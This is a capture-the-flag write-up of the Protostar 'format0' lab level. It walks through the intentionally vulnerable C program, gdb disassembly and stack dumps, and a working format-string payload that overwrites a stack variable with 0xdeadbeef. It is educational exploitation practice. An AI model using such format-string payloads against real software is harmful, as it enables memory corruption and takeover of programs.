## FORMAT ZERO ##
This level introduces format strings, and how attacker supplied format strings can
modify the execution flow of programs.

Hints

This level should be done in less than 10 bytes of input.
“Exploiting format string vulnerabilities”
This level is at /opt/protostar/bin/format0

### Source Code ###
```C
nclude <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
    char buffer[64];

    target = 0;

    sprintf(buffer, string);
          
    if(target == 0xdeadbeef) {
        printf("you have hit the target correctly :)\n");
    }
}

int main(int argc, char **argv)
{
    vuln(argv[1]);
}
```
After disassemble vuln function 
```
(gdb) disassemble vuln                                                                                                                                                                                                     
Dump of assembler code for function vuln:                                                                                                                                                                                  
0x080483f4 <vuln+0>:    push   %ebp
0x080483f5 <vuln+1>:    mov    %esp,%ebp
0x080483f7 <vuln+3>:    sub    $0x68,%esp
0x080483fa <vuln+6>:    movl   $0x0,-0xc(%ebp)
0x08048401 <vuln+13>:   mov    0x8(%ebp),%eax
0x08048404 <vuln+16>:   mov    %eax,0x4(%esp)
0x08048408 <vuln+20>:   lea    -0x4c(%ebp),%eax
0x0804840b <vuln+23>:   mov    %eax,(%esp)
0x0804840e <vuln+26>:   call   0x8048300 <sprintf@plt>
0x08048413 <vuln+31>:   mov    -0xc(%ebp),%eax
0x08048416 <vuln+34>:   cmp    $0xdeadbeef,%eax
0x0804841b <vuln+39>:   jne    0x8048429 <vuln+53>
0x0804841d <vuln+41>:   movl   $0x8048510,(%esp)
0x08048424 <vuln+48>:   call   0x8048330 <puts@plt>
0x08048429 <vuln+53>:   leave  
0x0804842a <vuln+54>:   ret    
End of assembler dump.
```

The following lines show registers and stacks before gets
```
eax            0xbffff74c       -1073744052
ecx            0x9b474635       -1689827787
edx            0x2      2
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff730       0xbffff730
ebp            0xbffff798       0xbffff798
esi            0x0      0
edi            0x0      0
eip            0x804840e        0x804840e <vuln+26>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff730:     0xbffff74c      0xbffff997      0x080481e8      0xbffff7c8
---Type <return> to continue, or q <return> to quit---
0xbffff740:     0xb7fffa54      0x00000000      0xb7fe1b28      0x00000001
0xbffff750:     0x00000000      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff760:     0xb7fd7ff4      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0xb7fd7ff4      0x08049624      0xbffff788      0x080482ec
0xbffff780:     0xb7ff1040      0x08049624      0xbffff7b8      0x00000000 <- here is our target
0x804840e <vuln+26>:    call   0x8048300 <sprintf@plt>
0x8048413 <vuln+31>:    mov    -0xc(%ebp),%eax

```

In order to hit the target, we need to find a way to skip 64 bytes before
because of the *buffer[64]*. In order to do that with less than 10 bytes and
exploit the format string. We notice that in protostar, we can play with a small
C program.
```C
#include "stdio.h"

int main (int argc, char *argv[]) {
    char buffer[64] = {0};

    sprintf(buffer, argv[1]);
    printf("%s\n", buffer);

    return 0;
}
```
We can notice the difference in space created by the format string indeed is
equal to the format string number. 
```
user@protostar:~$ ./sprintf_t "%1sa"
 a
 user@protostar:~$ ./sprintf_t "%0sa"
a
 user@protostar:~$ ./sprintf_t "%2sa"
  a
user@protostar:~$ ./sprintf_t "%3sa"
   a
```
Therefore, what we need to do is to enter the following input for format0

```
64s\xef\xbe\xad\xde
```
Let's try using python. Run the following in gdb
```
r "`python -c "print('%64s\xef\xbe\xad\xde')"`"
```

and the result
```
eax            0xdeadbeef       -559038737
ecx            0xbffff790       -1073743984
edx            0x4      4
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff730       0xbffff730
ebp            0xbffff798       0xbffff798
esi            0x0      0
edi            0x0      0
eip            0x8048416        0x8048416 <vuln+34>
eflags         0x200296 [ PF AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff730:     0xbffff74c      0xbffff997      0x080481e8      0xbffff7c8
---Type <return> to continue, or q <return> to quit---
0xbffff740:     0xb7fffa54      0x00000000      0xb7fe1b28      0x20202020
0xbffff750:     0x20202020      0x20202020      0x20202020      0x20202020
0xbffff760:     0x20202020      0x20202020      0x20202020      0x20202020
0xbffff770:     0x20202020      0x20202020      0x20202020      0x20202020
0xbffff780:     0x20202020      0x20202020      0x36202020      0xdeadbeef
0x8048416 <vuln+34>:    cmp    $0xdeadbeef,%eax
0x804841b <vuln+39>:    jne    0x8048429 <vuln+53>

Breakpoint 3, 0x08048416 in vuln (string=0xbffff997 "%64sﾭ", <incomplete sequence \336>)
at format0/format0.c:15
15      in format0/format0.c
(gdb) c
Continuing.
you have hit the target correctly :)

```










